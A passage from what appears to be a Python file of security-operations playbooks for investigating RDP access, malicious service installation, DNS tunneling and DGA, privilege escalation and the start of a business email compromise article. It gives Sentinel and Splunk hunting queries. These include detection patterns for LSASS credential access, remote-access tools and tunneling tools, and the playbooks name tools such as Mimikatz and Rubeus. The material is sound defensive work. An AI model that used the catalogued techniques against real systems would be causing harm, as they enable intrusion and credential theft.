// RDP session activity: what was done during the session
SecurityEvent
| where TimeGenerated > ago(24h)
| where Computer == "<TARGET_HOST>"
| where EventID in (4688, 4663, 4697, 4698, 4720)
| where TimeGenerated between (datetime("<SESSION_START>") .. datetime("<SESSION_END>"))
| project TimeGenerated, EventID, Activity, Account, ProcessName, CommandLine
| sort by TimeGenerated asc
```

### SPL (Splunk)

```spl
// External RDP connections
index=wineventlog EventCode=4624 LogonType=10
| where NOT cidrmatch("10.0.0.0/8", IpAddress)
    AND NOT cidrmatch("172.16.0.0/12", IpAddress)
    AND NOT cidrmatch("192.168.0.0/16", IpAddress)
| table _time Computer TargetUserName IpAddress WorkstationName

// RDP lateral movement mapping
index=firewall dest_port=3389 action=allowed
| where cidrmatch("10.0.0.0/8", src_ip) AND cidrmatch("10.0.0.0/8", dest_ip)
| stats count dc(dest_ip) as target_count values(dest_ip) as targets by src_ip
| where target_count > 3
| sort -target_count

// Remote access tool processes
index=sysmon EventCode=1
    (Image="*TeamViewer*" OR Image="*AnyDesk*" OR Image="*ScreenConnect*"
     OR Image="*LogMeIn*" OR Image="*Ammyy*")
| table _time Computer User Image CommandLine ParentImage

// RDP session duration analysis
index=wineventlog source="Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
    (EventCode=21 OR EventCode=23)
| eval action=case(EventCode=21, "logon", EventCode=23, "logoff")
| transaction User Computer maxspan=24h startswith="logon" endswith="logoff"
| eval duration_min=round(duration/60, 1)
| table _time Computer User duration_min
```

## Enrichment Steps

1. **Source IP Analysis**
   - For external IPs: check reputation on AbuseIPDB, Shodan, VirusTotal
   - Check if the IP is a known Tor exit node, VPN, or proxy
   - Determine the country and ASN of the source IP
   - Search for the IP in past incidents and threat intel feeds

2. **Account Verification**
   - Confirm the account is legitimate and expected to use remote access
   - Check if the account was recently created (persistence mechanism)
   - Verify the password was not recently changed (compromised credential rotation)
   - Check group memberships, especially Remote Desktop Users

3. **Host Context**
   - Should this host be accessible via RDP? (servers yes, DCs maybe, workstations usually no)
   - Is RDP exposed to the internet? (Critical misconfiguration)
   - Check for NLA enforcement and certificate-based authentication
   - Review installed remote access tools vs. approved tools list

4. **Session Activity Review**
   - Examine all process creation, file access, and network activity during the session
   - Look for reconnaissance commands (whoami, net user, nltest, systeminfo)
   - Check for tool downloads, lateral movement, credential access
   - Review clipboard content transfer and file copy operations

5. **Lateral Movement Assessment**
   - Map all hosts accessed from the RDP source
   - Check if the same credentials were used across multiple targets
   - Look for pass-the-hash or pass-the-ticket indicators
   - Identify the full attack path from initial access to current scope

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Approved admin RDP from expected source | Info | Log, close |
| RDP from unexpected internal host, no malicious activity | Medium | Investigate source host, verify user |
| External RDP to internet-exposed host | High | Block external RDP, investigate for compromise |
| Unauthorized remote tool installed | High | Escalate, remove tool, investigate installation source |
| RDP lateral movement across multiple hosts | Critical | Escalate to IR, likely active intrusion |
| RDP to domain controller from unexpected source | Critical | Escalate to IR, assume domain compromise possible |
| RDP from external IP with successful logon | Critical | Escalate to IR, isolate host, reset credentials |

## Documentation Template

```markdown
### Unauthorized RDP / Remote Access Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Connection Details:**
- Protocol / Tool: [RDP / VNC / TeamViewer / AnyDesk / SSH / Other]
- Source IP: [IP_ADDRESS]
- Source host: [HOSTNAME if internal]
- Destination host: [HOSTNAME]
- Destination port: [PORT]
- User account: [DOMAIN\USERNAME]
- Session start: [TIMESTAMP]
- Session end: [TIMESTAMP]
- Session duration: [MINUTES]

**Source Classification:**
- Internal or external: [INTERNAL / EXTERNAL]
- IP reputation: [CLEAN / MALICIOUS / VPN / TOR]
- Geo-location: [COUNTRY, CITY]
- Expected source for this user: [YES / NO]

**Session Activity:**
- Commands executed: [LIST]
- Files accessed or transferred: [LIST]
- Additional hosts contacted: [LIST]
- Tools downloaded or installed: [LIST]
- Credentials accessed: [YES/NO — details]

**Actions Taken:**
- [ ] Verified user and account legitimacy
- [ ] Reviewed full session activity
- [ ] Checked source IP reputation
- [ ] Blocked unauthorized remote access tool
- [ ] Disabled external RDP access
- [ ] Reset compromised credentials
- [ ] Isolated affected host(s)

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: If external unauthorized RDP, disconnect the session and isolate the host
2. **Block**: Remove internet-facing RDP exposure; enforce VPN-only remote access
3. **Investigate**: Review all session activity for signs of data access or lateral movement
4. **Contain**: Disable compromised accounts, remove unauthorized remote tools
5. **Harden**: Enforce NLA, deploy MFA for RDP, restrict Remote Desktop Users group, implement just-in-time access
""",
        ),
        # ---------------------------------------------------------------
        # Article 9: Suspicious Service Installation
        # ---------------------------------------------------------------
        (
            "Investigating a Suspicious Service Installation",
            ["alert-investigation", "service-installation", "persistence", "privilege-escalation", "defense-evasion"],
            r"""# Investigating a Suspicious Service Installation

## Alert Context

Windows service installations are a common persistence and privilege escalation mechanism. Attackers create malicious services to execute code as SYSTEM, survive reboots, and blend in with legitimate system activity. Alerts trigger on service creation events from unusual sources, services with suspicious binary paths, or services running from temporary directories.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| Windows Security | Event ID 4697 | ServiceName, ServiceFileName, ServiceAccount, SubjectUserName |
| Windows System | Event ID 7045 | ServiceName, ImagePath, ServiceType, StartType |
| Sysmon | Event ID 1 (sc.exe, services.exe) | CommandLine, ParentImage, User |
| Sysmon | Event ID 13 (Registry) | TargetObject, Details (service registry keys) |
| EDR | Service creation events | service_name, binary_path, account, parent_process |
| Registry | HKLM\SYSTEM\CurrentControlSet\Services | ImagePath, Start, Type, ObjectName |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Create or Modify System Process: Windows Service | T1543.003 | Persistence, Privilege Escalation |
| System Services: Service Execution | T1569.002 | Execution |
| Masquerading | T1036 | Defense Evasion |
| Hijack Execution Flow: DLL Side-Loading | T1574.002 | Persistence, Defense Evasion |

## Initial Triage Checklist

- [ ] Identify the new service name and display name
- [ ] Examine the service binary path (ImagePath) for anomalies
- [ ] Determine which user account created the service
- [ ] Check the service account (LocalSystem, LocalService, or a named account)
- [ ] Verify if the binary exists and check its file hash
- [ ] Determine the start type (auto, manual, disabled)
- [ ] Identify the parent process that triggered the service creation
- [ ] Cross-reference with known software installations and change management

## Suspicious Indicators

| Indicator | Why It Matters |
|-----------|---------------|
| Binary in Temp, AppData, ProgramData, or user profile | Legitimate services install to System32 or Program Files |
| Random or obfuscated service name | Legitimate services have descriptive names |
| Service running as SYSTEM from unusual path | Privilege escalation indicator |
| Service created by cmd.exe, powershell.exe, or wscript.exe | Scripted installation, possibly malicious |
| Binary path contains `cmd /c`, `powershell`, or pipes | Command execution via service, not a real binary |
| Service name mimics existing service (e.g., "WindowsUpdate") | Masquerading to avoid detection |
| Binary not digitally signed | Most legitimate services are signed |
| Service created outside of maintenance windows | Unexpected timing |

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// New service installations in the last 24 hours
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4697
| project TimeGenerated, Computer, SubjectUserName, ServiceName,
    ServiceFileName, ServiceAccount

// Services with suspicious binary paths
Event
| where TimeGenerated > ago(7d)
| where EventID == 7045
| where EventData has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\",
    "cmd /c", "powershell", "\\Users\\")
| project TimeGenerated, Computer, EventData

// Service creation initiated by unusual parent processes
SysmonEvent
| where TimeGenerated > ago(24h)
| where EventID == 1
| where Image endswith "\\sc.exe"
| where CommandLine has "create"
| project TimeGenerated, Computer, User, CommandLine, ParentImage

// Registry modifications to service keys
SysmonEvent
| where TimeGenerated > ago(24h)
| where EventID == 13
| where TargetObject has "\\Services\\"
| where TargetObject has "ImagePath"
| project TimeGenerated, Computer, User, TargetObject, Details

// Correlate service creation with subsequent network activity
let newServiceHosts = SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4697
| distinct Computer;
DeviceNetworkEvents
| where TimeGenerated > ago(24h)
| where DeviceName in (newServiceHosts)
| where RemoteIPType == "Public"
| summarize Connections = count() by DeviceName, RemoteIP, RemotePort
| sort by Connections desc
```

### SPL (Splunk)

```spl
// New service installations
index=wineventlog (EventCode=7045 OR EventCode=4697)
| table _time Computer ServiceName ImagePath ServiceAccount SubjectUserName

// Services from suspicious paths
index=wineventlog EventCode=7045
| where match(ImagePath, "(?i)(\\\\Temp\\\\|\\\\AppData\\\\|\\\\Users\\\\|cmd\s*/c|powershell)")
| table _time Computer ServiceName ImagePath ServiceAccount

// sc.exe create commands via Sysmon
index=sysmon EventCode=1 Image="*\\sc.exe" CommandLine="*create*"
| table _time Computer User CommandLine ParentImage

// Service registry key modifications
index=sysmon EventCode=13 TargetObject="*\\Services\\*" TargetObject="*ImagePath*"
| table _time Computer User TargetObject Details

// Timeline: service creation followed by process execution
index=wineventlog EventCode=7045
| append [search index=sysmon EventCode=1 ParentImage="*\\services.exe"]
| sort _time
| table _time Computer EventCode ServiceName Image CommandLine
```

## Enrichment Steps

1. **Binary Analysis**
   - Retrieve the service binary and compute SHA256
   - Submit hash to VirusTotal, check detection ratio and sandbox reports
   - Verify digital signature: signed by trusted publisher?
   - Check file metadata: company name, description, original filename
   - For DLLs loaded as services, check the hosting svchost group

2. **Process Ancestry**
   - Trace how the service was created: sc.exe, PowerShell, WMI, Group Policy?
   - Identify the initial process that led to service creation
   - Check if the creating user is an admin or the account was escalated

3. **Change Management**
   - Cross-reference with recent change requests and software deployments
   - Check SCCM/Intune/WSUS for recent software push operations
   - Verify with IT operations if this is a planned installation

4. **Behavioral Analysis**
   - Has this service name or binary path appeared elsewhere in the environment?
   - What does the service do when it runs? Check child processes and network activity
   - Review the service's startup dependencies and failure recovery actions

5. **Persistence Assessment**
   - Is the service set to auto-start?
   - Does it have failure recovery actions configured (restart, run a program)?
   - Are there additional persistence mechanisms on the same host?

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Legitimate software installation, change-managed | Info | Document, close |
| Unknown but signed binary, no malicious indicators | Low | Investigate further, verify with IT |
| Unsigned binary from temp directory | High | Escalate to Tier 2, isolate host if active |
| Service binary flagged malicious on VirusTotal | Critical | Escalate to IR, isolate host, remove service |
| Service running encoded PowerShell or cmd pipes | Critical | Escalate to IR, likely active compromise |
| Service installed on domain controller | Critical | Escalate to IR, assess domain compromise |

## Documentation Template

```markdown
### Suspicious Service Installation Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Service Details:**
- Service name: [SERVICE_NAME]
- Display name: [DISPLAY_NAME]
- Binary path (ImagePath): [FULL_PATH]
- Service account: [ACCOUNT]
- Start type: [Auto / Manual / Disabled]
- Service type: [Win32OwnProcess / Win32ShareProcess / Kernel Driver]

**Binary Analysis:**
- File exists: [YES/NO]
- SHA256: [HASH]
- File size: [SIZE]
- Digital signature: [SIGNED / UNSIGNED — Signer: NAME]
- VirusTotal detections: [COUNT/TOTAL]
- First seen: [DATE]

**Creation Context:**
- Created by user: [USERNAME]
- Creating process: [sc.exe / PowerShell / WMI / GPO / Other]
- Parent process: [PARENT_IMAGE]
- Host: [HOSTNAME]
- Host role: [Workstation / Server / DC]

**Post-Installation Activity:**
- Service started: [YES/NO]
- Child processes: [LIST]
- Network connections: [LIST]
- File writes: [LIST]

**Actions Taken:**
- [ ] Retrieved and analyzed service binary
- [ ] Checked VirusTotal and sandbox reports
- [ ] Verified against change management
- [ ] Reviewed service runtime behavior
- [ ] Disabled and removed malicious service
- [ ] Isolated host (if warranted)

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: If malicious, stop the service and isolate the host
2. **Analyze**: Retrieve the binary for sandbox analysis before deletion
3. **Remove**: Delete the service via `sc delete`, remove the binary, clean registry keys
4. **Scope**: Search for the same binary hash or service name across all endpoints
5. **Harden**: Restrict service creation permissions, monitor for service configuration changes, deploy application whitelisting
""",
        ),
        # ---------------------------------------------------------------
        # Article 10: DNS Tunneling or DGA Alerts
        # ---------------------------------------------------------------
        (
            "Investigating DNS Tunneling or DGA Alerts",
            ["alert-investigation", "dns-tunneling", "dga", "command-and-control", "exfiltration"],
            r"""# Investigating DNS Tunneling or DGA Alerts

## Alert Context

DNS tunneling encodes data in DNS queries and responses to create a covert communication channel that bypasses firewalls and proxies. Domain Generation Algorithms (DGAs) produce pseudo-random domain names that malware uses to locate its command-and-control servers. Both techniques abuse the DNS protocol, which is rarely inspected in depth, making it an attractive evasion method.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| DNS Server Logs | Query logs | query_name, query_type, client_ip, response_code |
| Passive DNS | DNS analytics | domain, subdomain_length, entropy, query_volume |
| Sysmon | Event ID 22 (DNS Query) | QueryName, Image, ProcessId |
| Network Security Monitor (Zeek/Bro) | dns.log | query, qtype, rcode, answers, id.orig_h |
| Firewall / IDS | DNS inspection | domain, category, threat_level, action |
| EDR | DNS queries per process | process_name, dns_query, destination_ip |
| Threat Intelligence | Domain feed | domain, malware_family, confidence, first_seen |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Application Layer Protocol: DNS | T1071.004 | Command and Control |
| Exfiltration Over Alternative Protocol | T1048 | Exfiltration |
| Dynamic Resolution: Domain Generation Algorithms | T1568.002 | Command and Control |
| Data Encoding: Standard Encoding | T1132.001 | Command and Control |

## Initial Triage Checklist

- [ ] Identify the source host and process generating the DNS queries
- [ ] Examine sample queries: are they high-entropy, long subdomain labels, or random-looking?
- [ ] Determine the query volume: how many queries per minute/hour?
- [ ] Check the queried domain(s): are they registered, newly created, or known malicious?
- [ ] Identify the DNS record types used (TXT, CNAME, MX are common for tunneling)
- [ ] Check if the queries resolve successfully or return NXDOMAIN
- [ ] Determine the data encoding method (base32, base64, hex in subdomain labels)
- [ ] Verify if this is a legitimate application (e.g., antivirus, CDN, DDNS updates)

## DNS Tunneling vs. DGA Indicators

| Feature | DNS Tunneling | DGA |
|---------|--------------|-----|
| Subdomain length | Very long (50+ chars) | Short-medium (10-20 chars) |
| Entropy per label | High (encoded data) | High (pseudo-random) |
| Query volume | High and sustained | Burst of NXDOMAIN responses |
| Record types | TXT, CNAME, MX, NULL | A, AAAA primarily |
| Resolution | Often resolves (C2 controlled) | Mostly NXDOMAIN, few resolve |
| Pattern | Consistent with one domain | Many unique second-level domains |
| Purpose | Data transfer / C2 comms | C2 domain discovery |

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// High-volume DNS queries from a single host
DnsEvents
| where TimeGenerated > ago(24h)
| summarize QueryCount = count(), UniqueQueries = dcount(Name),
    AvgQueryLength = avg(strlen(Name)) by ClientIP
| where QueryCount > 5000 or AvgQueryLength > 50
| sort by QueryCount desc

// Long subdomain queries (DNS tunneling indicator)
DnsEvents
| where TimeGenerated > ago(24h)
| extend SubdomainLength = strlen(tostring(split(Name, ".")[0]))
| where SubdomainLength > 40
| project TimeGenerated, ClientIP, Name, SubdomainLength, QueryType
| sort by SubdomainLength desc

// NXDOMAIN burst (DGA indicator)
DnsEvents
| where TimeGenerated > ago(4h)
| where ResultCode == "NXDOMAIN" or ResultCode == 3
| summarize NXCount = count(), Domains = make_set(Name, 50) by ClientIP
| where NXCount > 100
| sort by NXCount desc

// TXT record queries (common tunneling channel)
DnsEvents
| where TimeGenerated > ago(24h)
| where QueryType == "TXT" or QueryType == 16
| summarize TXTCount = count(), Domains = make_set(Name, 20) by ClientIP
| where TXTCount > 50
| sort by TXTCount desc

// DNS queries by process (Sysmon Event ID 22)
SysmonEvent
| where TimeGenerated > ago(24h)
| where EventID == 22
| where QueryName !endswith ".local" and QueryName !endswith ".internal"
| summarize QueryCount = count(), UniqueDomains = dcount(QueryName)
    by Image, Computer
| where QueryCount > 500
| sort by QueryCount desc
```

### SPL (Splunk)

```spl
// High-volume DNS queries per source
index=dns
| stats count as query_count dc(query) as unique_queries
    avg(eval(len(query))) as avg_length by src_ip
| where query_count > 5000 OR avg_length > 50
| sort -query_count

// Long subdomain labels (tunneling)
index=dns
| eval subdomain=mvindex(split(query, "."), 0)
| eval sub_len=len(subdomain)
| where sub_len > 40
| table _time src_ip query sub_len query_type
| sort -sub_len

// NXDOMAIN storm (DGA indicator)
index=dns reply_code="NXDOMAIN"
| stats count as nx_count dc(query) as unique_domains values(query) as sample_domains by src_ip
| where nx_count > 100
| sort -nx_count

// TXT record volume
index=dns query_type=TXT
| stats count as txt_count values(query) as domains by src_ip
| where txt_count > 50

// Entropy calculation for DNS queries
index=dns
| eval subdomain=mvindex(split(query, "."), 0)
| eval sub_len=len(subdomain)
| where sub_len > 15
| lookup ut_shannon_lookup word as subdomain OUTPUT ut_shannon as entropy
| where entropy > 3.5
| table _time src_ip query subdomain entropy sub_len
| sort -entropy
```

## Enrichment Steps

1. **Domain Analysis**
   - Check parent domain WHOIS: registration date, registrant, nameservers
   - Look up domain on VirusTotal, DomainTools, PassiveTotal
   - Check if the domain appears in DGA feeds or threat intelligence
   - Determine if the domain uses a privacy registrar (common for malicious domains)
   - Verify nameserver configuration (is it a known tunneling service like iodine?)

2. **Query Pattern Analysis**
   - Calculate Shannon entropy of subdomain labels (> 3.5 is suspicious)
   - Measure average and maximum subdomain label length
   - Identify the encoding scheme: base32 (A-Z, 2-7), base64, hex
   - Check for consistent patterns that suggest a specific tunneling tool
   - Known tools: iodine, dnscat2, dns2tcp, Cobalt Strike DNS beacon

3. **Process Identification**
   - Use Sysmon Event ID 22 or EDR DNS telemetry to identify the process
   - Check the process hash, path, and parent process
   - Determine if the process is a known legitimate application or malware

4. **Traffic Volume Assessment**
   - Calculate total data volume: (subdomain bytes per query) x (number of queries)
   - Compare against normal DNS baseline for the host
   - Estimate the bandwidth of the covert channel
   - Check for bidirectional data flow (queries = upload, responses = download)

5. **Lateral Context**
   - Are other hosts querying the same suspicious domain?
   - Is there correlated non-DNS C2 activity from the same host?
   - Check for malware on the endpoint that might be using DNS as a fallback channel

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Legitimate application (AV updates, CDN, cloud service) | Info | Whitelist, close |
| DDNS client or developer tool generating long queries | Low | Verify, whitelist, close |
| DGA queries + known malware family identified | High | Escalate, isolate host, remediate |
| Active DNS tunneling with data exfiltration | Critical | Escalate to IR, isolate host, block domain |
| DNS tunneling to known APT infrastructure | Critical | Escalate to IR, assume advanced adversary |
| Multiple hosts querying same DGA domains | Critical | Escalate to IR, scope outbreak |

## Documentation Template

```markdown
### DNS Tunneling / DGA Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Alert Type:** [ ] DNS Tunneling [ ] DGA [ ] Both

**Source Host:**
- Hostname: [HOSTNAME]
- IP: [IP]
- Process: [PROCESS_NAME] PID: [PID]
- User: [USERNAME]

**DNS Query Analysis:**
- Domain(s): [PARENT_DOMAIN(S)]
- Total queries in window: [COUNT]
- Unique subdomains: [COUNT]
- Average subdomain length: [CHARS]
- Maximum subdomain length: [CHARS]
- Shannon entropy: [VALUE]
- Record types used: [A / TXT / CNAME / MX]
- NXDOMAIN ratio: [PERCENTAGE]
- Sample queries: [LIST 5-10 EXAMPLES]

**Domain Enrichment:**
- Registration date: [DATE]
- Registrar: [NAME]
- Nameservers: [NS]
- VirusTotal verdict: [CLEAN / MALICIOUS — detections]
- Threat intel matches: [FEED_NAME — MALWARE_FAMILY]

**Estimated Data Transfer:**
- Upload (via queries): [BYTES/KB]
- Download (via responses): [BYTES/KB]
- Active duration: [HOURS/MINUTES]

**Actions Taken:**
- [ ] Identified source process and user
- [ ] Analyzed query patterns and encoding
- [ ] Checked domain reputation and threat intel
- [ ] Blocked domain at DNS resolver/firewall
- [ ] Isolated affected host
- [ ] Scanned host for malware

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: Block the tunneling domain at DNS resolver, firewall, and proxy
2. **Identify**: Determine the source process and investigate the malware
3. **Contain**: Isolate the affected host from the network
4. **Scope**: Check if other hosts are querying the same domain(s)
5. **Harden**: Deploy DNS security (DNS-over-HTTPS inspection, DNS response policy zones, anomaly-based DNS monitoring)
""",
        ),
        # ---------------------------------------------------------------
        # Article 11: Privilege Escalation Alerts
        # ---------------------------------------------------------------
        (
            "Investigating Privilege Escalation Alerts",
            ["alert-investigation", "privilege-escalation", "credential-access", "token-manipulation", "persistence"],
            r"""# Investigating Privilege Escalation Alerts

## Alert Context

Privilege escalation alerts fire when a user or process gains elevated permissions beyond what was initially granted. This includes local privilege escalation (user to SYSTEM/root), domain privilege escalation (user to Domain Admin), and cloud privilege escalation (gaining admin roles). Attackers escalate privileges to access sensitive data, install persistence, and move laterally.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| Windows Security | Event IDs 4672 (Special Logon), 4728/4732/4756 (Group Membership), 4648 (Explicit Credentials) | SubjectUserName, TargetUserName, MemberName, PrivilegeList |
| Sysmon | Event IDs 1, 8, 10, 13 | Process creation, CreateRemoteThread, ProcessAccess, Registry |
| Azure AD / Entra ID | AuditLogs | OperationName, TargetResources, ModifiedProperties |
| Linux | auth.log, syslog | sudo, su, setuid, capability changes |
| EDR | Privilege escalation detections | technique, process_tree, user_context |
| Active Directory | Directory changes | Group membership, AdminSDHolder, DCSync |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Exploitation for Privilege Escalation | T1068 | Privilege Escalation |
| Access Token Manipulation | T1134 | Defense Evasion, Privilege Escalation |
| Create or Modify System Process | T1543 | Persistence, Privilege Escalation |
| Domain Policy Modification | T1484 | Defense Evasion, Privilege Escalation |
| Account Manipulation: Additional Cloud Roles | T1098.003 | Persistence, Privilege Escalation |
| Abuse Elevation Control Mechanism: UAC Bypass | T1548.002 | Defense Evasion, Privilege Escalation |

## Initial Triage Checklist

- [ ] Identify the escalation type: local, domain, or cloud
- [ ] Determine the initial and resulting privilege level
- [ ] Identify the technique used (exploit, group membership change, token manipulation)
- [ ] Check who performed the action (self-escalation or admin-granted)
- [ ] Verify if this is a legitimate administrative action with change management approval
- [ ] Review the timeline: what happened before and after the escalation
- [ ] Check if the escalated account is now being used for lateral movement
- [ ] Assess the impact scope of the new privileges

## Pivot Queries

### KQL (Microsoft Sentinel)

```kql
// Sensitive group membership changes (Domain Admins, Enterprise Admins, etc.)
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID in (4728, 4732, 4756)
| where TargetUserName has_any ("Domain Admins", "Enterprise Admins",
    "Schema Admins", "Administrators", "Account Operators", "Backup Operators")
| project TimeGenerated, Computer, SubjectUserName, MemberName, TargetUserName, Activity

// Special privilege logons (admin tokens)
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4672
| where SubjectUserName !endswith "$"
| where SubjectUserName != "SYSTEM"
| summarize PrivLogons = count(), Hosts = make_set(Computer, 10)
    by SubjectUserName
| where PrivLogons > 5
| sort by PrivLogons desc

// Token manipulation and impersonation (Sysmon)
SysmonEvent
| where TimeGenerated > ago(24h)
| where EventID == 10
| where TargetImage == "C:\\Windows\\System32\\lsass.exe"
| where GrantedAccess has_any ("0x1010", "0x1410", "0x1438", "0x143a")
| project TimeGenerated, Computer, SourceImage, SourceUser,
    TargetImage, GrantedAccess

// Azure AD role assignments
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has_any ("Add member to role", "Add eligible member to role",
    "Add scoped member to role")
| extend Target = tostring(TargetResources[0].userPrincipalName)
| extend Role = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue)
| project TimeGenerated, InitiatedBy, Target, Role, Result

// UAC bypass indicators
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where ProcessIntegrityLevel == "High"
| where InitiatingProcessIntegrityLevel == "Medium"
| where InitiatingProcessFileName !in ("consent.exe", "dllhost.exe")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, AccountName
```

### SPL (Splunk)

```spl
// Sensitive AD group changes
index=wineventlog (EventCode=4728 OR EventCode=4732 OR EventCode=4756)
| search TargetUserName="Domain Admins" OR TargetUserName="Enterprise Admins"
    OR TargetUserName="Schema Admins" OR TargetUserName="Administrators"
| table _time Computer SubjectUserName MemberName TargetUserName Activity

// LSASS access (credential dumping / token theft)
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| where NOT match(SourceImage, "(?i)(MsMpEng|csrss|svchost|wininit|lsass)")
| table _time Computer SourceImage SourceUser GrantedAccess CallTrace

// Sudo abuse on Linux
index=linux sourcetype=linux:auth ("sudo" AND NOT "session opened")
| rex field=_raw "user=(?<sudo_user>\S+)"
| rex field=_raw "COMMAND=(?<command>.+)"
| table _time host sudo_user command
| sort -_time

// Azure AD role escalation
index=azure_ad sourcetype="azure:aad:audit"
    operationName="Add member to role"
| table _time initiatedBy targetResources result

// Process running with SYSTEM context from user-space parent
index=sysmon EventCode=1 User="NT AUTHORITY\\SYSTEM"
| where NOT match(ParentImage, "(?i)(services|wininit|smss|csrss|svchost)")
| table _time Computer Image CommandLine ParentImage User
```

## Enrichment Steps

1. **Legitimacy Verification**
   - Cross-reference with change management tickets and approval workflows
   - Verify with the admin who made the change (if it was an admin action)
   - Check if the escalated user is in IT, security, or an authorized role
   - Review break-glass account usage policies if applicable

2. **Technique Identification**
   - Local exploits: check for known CVEs (PrintNightmare, HiveNightmare, PetitPotam)
   - Token manipulation: look for SeDebugPrivilege usage, token impersonation processes
   - UAC bypass: check for auto-elevating COM objects, DLL hijacking, fodhelper.exe
   - Domain escalation: DCSync, Kerberoasting, AS-REP roasting, group policy abuse
   - Cloud: role assignment, PIM activation, consent grant abuse

3. **Pre-Escalation Activity**
   - What was the user doing before gaining elevated privileges?
   - Check for reconnaissance: whoami /priv, net localgroup administrators, Get-ADGroupMember
   - Look for exploit tool artifacts: JuicyPotato, PrintSpoofer, Rubeus, Mimikatz
   - Check for vulnerability scanning or exploit attempt artifacts

4. **Post-Escalation Activity**
   - What did the user do with the elevated privileges?
   - Check for: credential dumping, lateral movement, data access, persistence installation
   - Review all process creation, file access, and network activity after escalation
   - Look for additional privilege escalation (pivoting from local admin to domain admin)

5. **Scope Assessment**
   - Are there other hosts where the same user or technique has been used?
   - Check if the escalated credentials are being used across the environment
   - For domain escalation, assess if domain dominance has been achieved

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Legitimate admin action with change management approval | Info | Document, close |
| User added to local admin group by IT, verified | Low | Verify necessity, close |
| Unauthorized group membership change | High | Escalate, revert change, investigate |
| LSASS access from non-security tool | High | Escalate to Tier 2, investigate host |
| Domain Admin group modified without authorization | Critical | Escalate to IR, revert immediately |
| DCSync or Kerberoasting detected | Critical | Escalate to IR, assume domain compromise |
| Cloud global admin role assigned unexpectedly | Critical | Escalate to IR, revoke role, investigate |

## Documentation Template

```markdown
### Privilege Escalation Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Escalation Type:** [ ] Local [ ] Domain [ ] Cloud
**Technique:** [GROUP_CHANGE / EXPLOIT / TOKEN / UAC_BYPASS / ROLE_ASSIGNMENT]

**User/Account:**
- Account: [USERNAME]
- Previous privilege level: [STANDARD USER / LOCAL ADMIN / etc.]
- New privilege level: [LOCAL ADMIN / DOMAIN ADMIN / GLOBAL ADMIN / etc.]
- Account type: [Interactive / Service / Managed]

**Escalation Details:**
- Method: [How the privilege was gained]
- Performed by: [SELF / OTHER_ADMIN]
- Host: [HOSTNAME]
- Process: [PROCESS_NAME] PID: [PID]
- Change management ticket: [TICKET_ID or N/A]

**Pre-Escalation Activity:**
[Summary of what happened before the privilege change]

**Post-Escalation Activity:**
[Summary of what was done with elevated privileges]

**Actions Taken:**
- [ ] Verified legitimacy with change management
- [ ] Reviewed pre/post escalation activity
- [ ] Reverted unauthorized privilege change
- [ ] Reset compromised credentials
- [ ] Isolated affected host (if warranted)
- [ ] Scanned for exploit artifacts

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: Revert unauthorized privilege changes (remove from group, revoke role)
2. **Investigate**: Review all activity performed with elevated privileges
3. **Contain**: Disable compromised accounts, isolate hosts with exploit artifacts
4. **Scope**: Check for the same escalation technique across the environment
5. **Harden**: Implement least privilege, deploy Privileged Access Management (PAM), enable PIM with time-limited elevation, restrict LSASS access with Credential Guard
""",
        ),
        # ---------------------------------------------------------------
        # Article 12: Business Email Compromise (BEC)
        # ---------------------------------------------------------------
        (
            "Investigating a Business Email Compromise (BEC)",
            ["alert-investigation", "bec", "email-compromise", "fraud", "account-takeover"],
            r"""# Investigating a Business Email Compromise (BEC)

## Alert Context

Business Email Compromise is a sophisticated fraud scheme where attackers compromise or impersonate business email accounts to redirect payments, steal data, or conduct further social engineering. BEC is one of the highest financial impact cyber threats, with average losses exceeding $125,000 per incident. Attackers may use credential phishing, password spray, or token theft to gain access, then operate quietly using inbox rules to hide their activity.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| Azure AD / Entra ID | SigninLogs | UserPrincipalName, IPAddress, Location, AppDisplayName |
